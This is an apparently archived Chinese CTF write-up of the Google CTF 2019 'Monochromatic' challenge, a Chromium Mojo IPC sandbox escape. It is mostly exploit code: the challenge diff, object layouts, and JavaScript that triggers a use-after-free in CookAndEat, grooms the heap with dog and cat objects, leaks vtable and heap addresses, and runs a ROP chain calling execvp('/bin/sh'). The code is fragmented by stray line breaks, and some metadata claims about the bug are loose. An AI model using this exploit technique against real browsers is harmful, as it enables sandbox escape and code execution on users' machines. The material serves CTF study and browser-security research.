---
title: 沙箱逃逸之google ctf 2019 Monochromatic writeup
contest: Google CTF 2019
year: 2019
difficulty: insane
vuln_type: rce
tags:
- Chromium Mojo IPC
- Person/Dog/Cat Interface
- BeingCreatorInterface
- Blink
- content_browser_manifest
- MojoJS
attack_chain: Mojo IDL定义BeingCreatorInterface+PersonInterface+DogInterface+CatInterface→content_browser_manifest暴露blink.mojom.BeingCreatorInterface→renderer调用CreatePerson/CreateDog/CreateCat→Impl侧直接传入blink::mojom::FoodInterface引用计数处理UAF→sandbox逃逸
key_payload: mojo public/tools/bindings/mojom.gni;interface BeingCreatorInterface CreatePerson CreateDog CreateCat;PersonInterface GetName/SetName/GetAge/SetAge/GetWeight/SetWeight/CookAndEat(blink.mojom.FoodInterface food)
one_liner: Google CTF 2019 Monochromatic：Chromium Mojo IPC BeingCreatorInterface + 3 Interface UAF沙箱逃逸
lesson: Blink Mojo IPC新增Interface需注册到content_browser_manifest；FoodInterface引用计数UAF是逃逸点
quality: high
full_path: 沙箱逃逸之google_ctf_2019_Monochromatic_writeup.full.md
meta_path: 沙箱逃逸之google_ctf_2019_Monochromatic_writeup.meta.md
images_removed: true
images_removed_count: 2
schema_version: v3.0.0-P0
summary: 沙箱逃逸之google ctf 2019 Monochromatic writeup。Google CTF 2019 Monochromatic：Chromium Mojo IPC BeingCreatorInterface + 3 Interface UAF沙箱逃逸。经验：Blink Mojo IPC新增Interface需注册到content_browser_manifest；FoodI...
category: web
subcategory: rce
code_blocks_count: 1
images_count: 2
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/91451.html
reasoning_chain:
- 题目给 chrome_diff.diff 改 content_browser_manifest.cc → 触发点：暴露新 Mojo interface 到 renderer
- 新增 blink.mojom.BeingCreatorInterface + PersonInterface + DogInterface + CatInterface
- PersonInterface 含 CookAndEat(blink.mojom.FoodInterface food) → 假设：CookAndEat 接收 interface 引用
- 动作：renderer 端 JS 调 CreatePerson/CreateDog/CreateCat → 拿到 Ptr
- Impl 侧直接传 blink::mojom::FoodInterface 引用计数处理 → 假设：FoodInterface 引用计数异常
- 观察：FoodInterface 引用计数竞态 + UAF → 假设：可逃逸 renderer 沙箱
- 假设：逃逸点是把 FoodInterface 当 raw 指针解引用 → 动作：构造 fake interface object
- 观察：impl side 写入虚表 → 触发任意函数调用 → 完成沙箱逃逸
failed_attempts:
- 试图用 Mojo Python binding → 失败：题目改的是 C++ blink 内部 Mojo
- 试图跳过 CookAndEat 直接拿 FoodInterface Ptr → 失败：必须通过 CreatePerson 才能拿
- 试图利用 PersonInterface getter → 失败：getter 不触发引用计数 UAF
key_observations:
- Mojo IPC 新增 interface 必须注册到 content_browser_manifest.cc 才能在 renderer 调用
- CookAndEat 接收 interface 参数是引用计数 UAF 经典触发点
- Blink 中 interface Ptr 是胖指针（vtable + data），伪造 Ptr 即任意 C++ 调用
- Chrome 沙箱逃逸通用链：Mojo IPC → Impl side UAF → 虚表指针覆盖 → RCE
- ExposeInterfaceFilterCapability_Deprecated 是新版 Mojo 接口过滤机制
prerequisites:
- Chromium Mojo IPC 机制（interface + Ptr + binding）
- Chromium 多进程架构（browser/renderer/GPU/utility）
- C++ 虚表与多态实现
- Chromium 编译（ninja + GN）与 patch 流程
---
# 沙箱逃逸之google ctf 2019 Monochromatic writeup

> 原文: https://www.ctfiot.com/91451.html
> ID: 91451


```
module test.echo.mojom;

interface Echo {
 EchoInteger(int32 value) => (int32 result);
};
import("//mojo/public/tools/bindings/mojom.gni")

mojom("interfaces") {
 sources = [
    "echo.mojom",
 ]
}
ninja -C out/r services/echo/public/interfaces:
interfaces_js
out/gen/services/echo/public/interfaces/echo.mojom.js
<!DOCTYPE html>
<script src="URL/to/mojo_bindings.js"></script>
<script src="URL/to/echo.mojom.js"></script>
<script>

var echoPtr = new test.echo.mojom.EchoPtr();
var echoRequest = mojo.makeRequest(echoPtr);
// ...

</script>
<!DOCTYPE html>
<script src="URL/to/mojo_bindings.js"></script>
<script src="URL/to/echo.mojom.js"></script>
<script>

function EchoImpl() {}
EchoImpl.prototype.echoInteger = function(value) {
  return Promise.resolve({result: value});
};

var echoServicePtr = new test.echo.mojom.EchoPtr();
var echoServiceRequest = mojo.makeRequest(echoServicePtr);
var echoServiceBinding = new mojo.Binding(test.echo.mojom.Echo,
                                          new EchoImpl(),
                                          echoServiceRequest);
echoServicePtr.echoInteger({value: 123}).then(function(response) {
  console.log('The result is ' + response.value);
});

</script>
$ ls
Dockerfile       build_docker.sh chrome_diff.diff flag             interfaces       note             run_docker.sh   src
args = [
    './binary/chrome',
    '--enable-blink-features=MojoJS',
    '--disable-gpu',
    '--headless',
    '--repl', #this flag makes chrome not to exit right after the webpage is loaded, this flag is not a part of the CTF challenge
    server
 ]
diff --git a/content/public/app/content_browser_manifest.cc b/content/public/app/content_browser_manifest.cc
index a1fa37e05edf..a1034e1b1a40 100644
--- a/content/public/app/content_browser_manifest.cc
+++ b/content/public/app/content_browser_manifest.cc
@@ -197,6 +197,7 @@ const service_manager::
Manifest& GetContentBrowserManifest() {
           .ExposeInterfaceFilterCapability_Deprecated(
               "navigation:
frame", "renderer",
               std::
set<const char*>{
+                 "blink.mojom.BeingCreatorInterface",
                   "autofill.mojom.AutofillDriver",
                  
...
+import "url/mojom/origin.mojom";
+import "third_party/blink/public/mojom/CTF/person_interface.mojom";
+import "third_party/blink/public/mojom/CTF/dog_interface.mojom";
+import "third_party/blink/public/mojom/CTF/cat_interface.mojom";
+
+interface BeingCreatorInterface {
+ CreatePerson() => (blink.mojom.PersonInterface? person);
+ CreateDog() => (blink.mojom.DogInterface? dog);
+ CreateCat() => (blink.mojom.CatInterface? cat);
+};
+interface PersonInterface {
+ GetName() => (string name);
+ SetName(string new_name) => ();
+ GetAge() => (uint64 age);
+ SetAge(uint64 new_age) => ();
+ GetWeight() => (uint64 weight);
+ SetWeight(uint64 new_weight) => ();
+ CookAndEat(blink.mojom.FoodInterface food) => ();
+};
+class CONTENT_EXPORT CatInterfaceImpl
+   : public blink::
mojom::
CatInterface {
+
+ std::
string name;
+ uint64_t age;
+ uint64_t weight;

+class CONTENT_EXPORT DogInterfaceImpl
+   : public blink::
mojom::
DogInterface {
+
+ uint64_t weight;
+ std::
string name;
+ uint64_t age;

+class CONTENT_EXPORT PersonInterfaceImpl
+   : public blink::
mojom::
PersonInterface {
+
+ uint64_t age;
+ uint64_t weight;
+ std::
string name;
+void PersonInterfaceImpl::
CookAndEat(blink::
mojom::
FoodInterfacePtr foodPtr,
+                                     CookAndEatCallback callback) {
+ blink::
mojom::
FoodInterface *raw_food = foodPtr.get();
+
+ raw_food->GetWeight(base::
BindOnce(&PersonInterfaceImpl::
AddWeight,
+                                     base::
Unretained(this),
+                                     std::
move(callback), std::
move(foodPtr)));
+}
+void PersonInterfaceImpl::
AddWeight(
+   PersonInterfaceImpl::
CookAndEatCallback callback,
+   blink::
mojom::
FoodInterfacePtr foodPtr, uint64_t weight_)
+module blink.mojom;
+
+import "url/mojom/origin.mojom";
+
+interface FoodInterface {
+ GetDescription() => (string description);
+ SetDescription(string new_description) => ();
+ GetWeight() => (uint64 weight);
+ SetWeight(uint64 new_weight) => ();
+};
+void PersonInterfaceImpl::
AddWeight(
+   PersonInterfaceImpl::
CookAndEatCallback callback,
+   blink::
mojom::
FoodInterfacePtr foodPtr, uint64_t weight_) {
+ weight += weight_;
+ std::
move(callback).Run();
+}
...
+void PersonInterfaceImpl::
CookAndEat(blink::
mojom::
FoodInterfacePtr foodPtr,
+                                     CookAndEatCallback callback) {
+ blink::
mojom::
FoodInterface *raw_food = foodPtr.get();
+
+ raw_food->GetWeight(base::
BindOnce(&PersonInterfaceImpl::
AddWeight,
+                                     base::
Unretained(this),
+                                     std::
move(callback), std::
move(foodPtr)));
+}
struct __long
{
    pointer   __data_;
    size_type __size_;
    size_type __cap_;
};
class CONTENT_EXPORT CatInterfaceImpl:

pointer vtable;
  pointer   __data_;
  size_type __size_;
  size_type __cap_;
  uint64_t age;
  uint64_t weight;

class CONTENT_EXPORT DogInterfaceImpl:

pointer vtable;
  uint64_t weight;
  pointer   __data_;
  size_type __size_;
  size_type __cap_;
  uint64_t age;

class CONTENT_EXPORT PersonInterfaceImpl:

pointer vtable;
  uint64_t age;
  uint64_t weight;
  pointer   __data_;
  size_type __size_;
  size_type __cap_;
function FoodInterfaceImpl() {}
FoodInterfaceImpl.prototype.getWeight = async function() {
    if(!this.weight) {
        return {'weight': 0x101};
   }
    return {'weight': this.weight};
};

FoodInterfaceImpl.prototype.setWeight = async function(weight) {
    this.weight = weight;
    return;
};

FoodInterfaceImpl.prototype.setDescription = async function(desc) {
    this.desc = desc;
    return ;
};

FoodInterfaceImpl.prototype.getDescription = async function() {
    if (!this.description) {
        return {'description': 'null'};
   }
    return {'description': this.description};
};
let dogCount = 8;
    let catCount = 0x10;

    // create 8 dogs with the same size of name
    let dogPtrArr = [];
    let catPtrArr = [];
    for (let i=0; i<dogCount; i++) {
        let dogPtr = (await mojoPtr.createDog()).dog;
        await dogPtr.setName('a'.repeat(stringSize))
        dogPtrArr.push(dogPtr);
   }
// get the FoodInterface in render process
    var foodInterfacePtr = new blink.mojom.FoodInterfacePtr();
    var foodInterfaceRequest = mojo.makeRequest(foodInterfacePtr);
    var foodInterfaceBinding = new mojo.Binding(
        blink.mojom.FoodInterface,
        new FoodInterfaceImpl(),
        foodInterfaceRequest);
// trigger uaf vuln
    dogPtrArr[dogPtrArr.length-1].cookAndEat(foodInterfacePtr)
// the getWeight of FoodInterfaceImpl, which forms a uaf vuln.
    FoodInterfaceImpl.prototype.getWeight = async function() {

        // release the last dogPtr
        dogPtrArr.pop().ptr.reset();

        // change the dog's name size, which will leave the a lot of hole (size 0x40)
        for(let i=0; i<dogPtrArr.length; i++) {
            await dogPtrArr[i].setName('a'.repeat(stringSize*100));
       }

        // create cat to fill the hole
        for(let i=0; i<catCount; i++) {
            let catPtr = (await mojoPtr.createCat()).cat;
            catPtrArr.push(catPtr);
       }

        // create cat name(0x40) to fill the hole, there will be two Neighboring name
        for(let i=0; i<catCount; i++) {
            await catPtrArr[i].setName(id2Str(i, stringSize));
       }

        // return 0x40 will change one cat's name to the Neighboring cat's name, which will form a overlap chunk.
        return {'weight': 0x40};
   };
// find the evil cat and victim cat
    let evilIdx = -1;
    let evil = undefined;
    for(let i =0; i<catCount; i++){
        let name = (await catPtrArr[i].getName()).name;
        if (name != id2Str(i, stringSize)){
            evilIdx = i;
            evil = catPtrArr[i];
            break;
       }
   }

    if(evilIdx == -1) {
        console.log("[-] can't find overlap cat name")
        return;
   }
    let name = (await evil.getName()).name;
    let victimIdx = str2Id(name);
    let victim = catPtrArr[victimIdx];
    if (victimIdx<0 || victimIdx>=catCount) {
        console.log("[-] can't find overlap cat name")
        return;
   }
    console.log("[+] evil cat idx: "+evilIdx);
    console.log("[+] victim cat idx: "+victimIdx);
    console.log("[+] evil cat name: "+name);
// change the victim cat's name, now the evil cat name pointer will be freed
    victim.setName('a'.repeat(stringSize*200));

    let ropBufferSize = 0x100;

    // create a personPtr, now the evil cat's name pointer point to the personPtr structure
    let triggerPersonPtr = (await mojoPtr.createPerson()).person;
    await triggerPersonPtr.setName('A'.repeat(ropBufferSize));

    // leak the data
    let leakData = (await evil.getName()).name;
    let personVtableAddr = getUint64(leakData, 0);
    let leakHeapAddr = getUint64(leakData, 0x18);

    let baseAddr = personVtableAddr - 0x8fc19c0n;
    let highAddr = baseAddr&BigInt(0xf00000000000)
    let lowAddr = baseAddr&BigInt(0x000000000fff)
    if((highAddr != BigInt(0x500000000000)) && lowAddr !=0 ) {
        console.log("[-] leak addr failed")
        return;
   }
    console.log("[+] chrome base addr: "+hex(baseAddr));
    console.log("[+] leak heap addr: "+hex(leakHeapAddr));
// build rop chain
    let binshAddr = leakHeapAddr+0x68n;
    let ropBuffer = new ArrayBuffer(ropBufferSize);
    let ropData8 = new Uint8Array(ropBuffer).fill(0x41);
    ropDataView = new DataView(ropBuffer);

    // person getName's offset in vtable is 0x10;
    ropDataView.setBigInt64(0x10,xchgRaxRsp,true);

    ropDataView.setBigInt64(0x0, popRsi, true);
    ropDataView.setBigInt64(0x8, popRsi, true);

    ropDataView.setBigInt64(0x18, popRdi, true);
    ropDataView.setBigInt64(0x20, binshAddr, true);
    ropDataView.setBigInt64(0x28, popRsi, true);
    ropDataView.setBigInt64(0x30, 0n, true);
    ropDataView.setBigInt64(0x38, 0n, true);
    ropDataView.setBigInt64(0x40, popRdx, true);
    ropDataView.setBigInt64(0x48, 0n, true);
    ropDataView.setBigInt64(0x50, popRdx, true);
    ropDataView.setBigInt64(0x58, 0n, true);
    ropDataView.setBigInt64(0x60, execvp, true);
    ropDataView.setBigInt64(0x68,0x68732f6e69622fn,true);  // /bin/sh
    // ropDataView.setBigInt64(0x68, 0x6f6e672f6e69622fn,true); // /bin/gno
    // ropDataView.setBigInt64(0x70, 0x75636c61632d656dn,true); // me-calcu
    // ropDataView.setBigInt64(0x78, 0x726f74616cn,true); // latorx00

    let ropStr = arr2Str(ropData8);

    // set fake vtable here
    await triggerPersonPtr.setName(ropStr);

    // change triggerPersonPtr's vtable to fake vtable address
    evilData = setUint64(leakData, 0, leakHeapAddr);
    await evil.setName(evilData);

    // trigger rop
    console.log((await triggerPersonPtr.getName()).name);
mojo.internal.Buffer.prototype.setUint64 = function(offset, value) {
    value = BigInt(value);
    let multipliter = 0x100000000n;
    var hi = Number(value / multipliter);
    var low = Number(value % multipliter);
    this.dataView.setInt32(offset, low, true);
    this.dataView.setInt32(offset + 4, hi, true);
    return;
};

mojo.internal.encodeUtf8String = function(str, outputBuffer) {
    const utf8Buffer = str.split('').map(char => char.charCodeAt(0));
    if (outputBuffer.length < utf8Buffer.length)
        throw new Error("Buffer too small for encodeUtf8String");
    outputBuffer.set(utf8Buffer);
    return utf8Buffer.length;
}

mojo.internal.decodeUtf8String = function(buffer) {
    return Array.from(new Uint8Array(buffer.buffer, buffer.byteOffset,
        buffer.byteLength)).
        map(code => String.fromCharCode(code)).join('');
}
```


---
## 附图

[图片已移除]
[图片已移除]